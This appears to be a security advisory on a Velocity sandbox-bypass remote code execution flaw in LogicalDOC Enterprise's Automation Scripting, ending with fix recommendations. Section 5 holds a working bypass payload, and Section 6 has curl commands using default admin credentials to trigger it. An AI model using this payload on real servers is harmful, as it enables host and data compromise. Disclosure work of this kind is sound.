# LogicalDOC Enterprise — Automation Scripting Sandbox-Bypass RCE

## 1. Research Target & Attack Surface

LogicalDOC Enterprise Edition 9.3 (LogicalDOC Srl, Italy) is a Java/Tomcat web DMS used by organizations to store and route documents. We targeted its **Automation Scripting** feature: a Velocity-based scripting engine for administrators is a classic place where "scripting" and "security boundary" collide, and this feature had a prior public CVE (CVE-2024-54448) — a strong signal the fix was bolted on rather than designed.

Relevant surface:

| Item | Value |
|---|---|
| Automation sink | `com.logicaldoc.core.automation.Automation.evaluate` (Velocity) |
| Reachable paths | GWT `AutomationServiceImpl.execute`; DB-trigger `AutomationEventListener.newEvent` |
| Auth | Spring Security opt-in per pattern; default credential `admin/admin` (CWE-798) |
| License gate | `Feature.AUTOMATION` (trial enables all features) |

The Automation sink is behind authentication: `/services/rest/**` requires a valid session (read from the `sid` header), and the seeded default credential `admin/admin` provides one (CWE-798). Two authenticated paths reach the sink — the GWT direct-execution path (script from the request when `guiRoutine.getId()==0`) and the DB event-trigger path.

## 2. Sink Identification: Velocity with Default Reflection

`com.logicaldoc.core.automation.Automation.evaluate(expression, dictionary)` evaluates an admin-authored script with Apache Velocity. The prior CVE fix added `forbidRuntimeUsage`:

```java
private void forbidRuntimeUsage(String expression) {
    if (expression.contains("java.lang.Runtime")) {            // block ① literal substring
        throw new ForbiddenCodeException("...");
    }
    Pattern runtimePattern = Pattern.compile("\\.\\s*(getRuntime|runtime)", 32);  // block ② regex
    if (runtimePattern.matcher(expression).find()) {
        throw new ForbiddenCodeException("...");
    }
}
// then:
Velocity.evaluate(context, writer, logTag, expression);   // default UberspectImpl allows reflection
```

The "fix" is a **string blacklist**. The default Velocity `UberspectImpl` still permits reflection — no SecureUberspector, no EventCartridge, no SecurityManager. Any expression that reaches `Runtime` without containing the literal blacklisted substrings bypasses the sandbox (CWE-94).

## 3. Source Identification: Script Content

The GWT path: `AutomationServiceImpl.execute` takes `guiRoutine.getAutomation()` directly from the request when `guiRoutine.getId()==0` — attacker-supplied script text, no DB required.

The DB event-trigger path: `AutomationEventListener.newEvent` → `HibernateAutomationTriggerDAO.getAutomation` loads an inline `ld_automation` script from a trigger row. `findByAK(null, folderId, tenantId)` matches a trigger with `events IS NULL` — i.e. "any event on this folder". A DB-seeded trigger with an inline script fires on any document upload to the folder.

## 4. End-to-End Data Flow (DB event-trigger path, verified)

```
HTTP POST /services/rest/document/upload (header sid, folderId=4)
  → DocumentService.upload (authenticated via sid)
  → document.store History event (event=store, folderId=4, tenantId=1)
  → AutomationEventListener.newEvent(event)
  → checkLicense (AUTOMATION enabled) + RunLevel.aspectEnabled(AUTOMATION)
  → getRoutine → findByAK(null, 4, 1) matches DB trigger (events=NULL)
  → routine loaded (ld_automation = bypass script)
  → execute(routine, {event,document,folder}, fork=true) → 1000ms schedule
  → Automation.evaluate(script, dictionary)
  → forbidRuntimeUsage(script)   ← bypassed (see below)
  → Velocity.evaluate → reflection → Runtime.getRuntime().exec(...)
  → RCE in the Tomcat process context
```

## 5. Exploit Construction: Bypassing the Blacklist

The sandbox has only two string checks. The bypass script (the dictionary contains `$event`, not `$user`):

```velocity
#set($rt=$event.class.forName('java.lang.Ru'+'ntime').getMethod('getRuntime').invoke(null))
#set($p=$rt.exec('touch /opt/logicaldoc/tomcat/webapps/ROOT/ld_rce_proof.txt'))
```

Check against each block:
- `'java.lang.Ru'+'ntime'` — string concatenation means the expression text **never contains** the literal `java.lang.Runtime` → block ① does not fire
- `.getMethod('getRuntime')` — `getRuntime` sits inside a string literal preceded by `'` (not `.`), so regex `\.getRuntime` does not match → block ② does not fire
- `$event.class.forName(...)` — `$event` is a History object; `.class` → `getClass()`, `.forName` → `Class.forName` via instance reflection (allowed by default UberspectImpl) → reaches the `java.lang.Runtime` Class
- `.getMethod('getRuntime').invoke(null)` → `Runtime.getRuntime()`
- `$rt.exec(...)` → `Runtime.exec` command execution (`.exec` doesn't match the sandbox regex)

No second line of defense: no SecureUberspector, no class/method whitelist, no SecurityManager.

## 6. Dynamic Verification (HTTP trigger + HTTP verify)

Verification used the DB event-trigger path with a DB-seeded routine/trigger (folder 4, events=NULL):

```bash
# Login
curl "http://<TARGET_IP>:8090/services/rest/auth/login?u=admin&pw=admin"
# → <sid>

# Upload a trigger document (header sid)
curl -X POST "http://<TARGET_IP>:8090/services/rest/document/upload" \
  -H "sid: <sid>" \
  -F folderId=4 -F filename=poc_trigger.txt -F filedata=@poc_trigger.txt
# → 200, document ID

# HTTP verification (proof file served from the webroot)
curl -s -w "%{http_code}" http://<TARGET_IP>:8090/ld_rce_proof.txt
# → 200 (RCE executed; proof file served)
```

The PoC script automates login, upload trigger, and proof check (pure Python standard library); the sandbox-bypass script is the payload.

## 7. Reachability & Impact

- **Auth**: default `admin/admin`; unauthenticated upload returns 401 (Spring Security protects `/services/rest/**`)
- **License**: AUTOMATION feature enabled (trial enables all 40 features)
- **GWT direct-execution path**: remote attacker vector without DB access — `id=0` + empty lists bypass the AUTOMATION permission check; the same sink is reached
- **Privilege**: Tomcat process context

The impact is authenticated (default `admin/admin`) sandbox bypass → arbitrary Java code execution in the DMS — full compromise of the document-management repository and the host.

## 8. Fix Recommendations

1. Replace the blacklist with a hardened Velocity sandbox (SecureUberspector; whitelist classes/methods; restrict reflection and `getClass`)
2. Block equivalent paths such as `java.lang.ProcessBuilder`
3. Enforce the AUTOMATION permission check on **all** paths, including GWT `execute` with `id=0`
4. Force password change for the default `admin` account
5. Run Tomcat with least privilege
